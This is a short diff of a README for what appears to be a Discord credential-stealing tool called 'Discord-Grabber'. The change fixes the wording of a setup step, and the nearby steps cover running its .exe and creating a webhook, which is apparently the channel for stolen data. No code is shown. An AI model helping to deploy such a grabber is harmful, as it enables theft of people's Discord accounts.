@@ -63,7 +63,7 @@ Once you've downloaded the files extract the folder so it's no longer a .zip fil
 ```
 ### 3. Open Discord-Grabber.exe File:
 ```
-You dont need to install any modules opening. 
+You dont need to install any other modules.  
 ```
 ### 4. Create A Webhook:
 
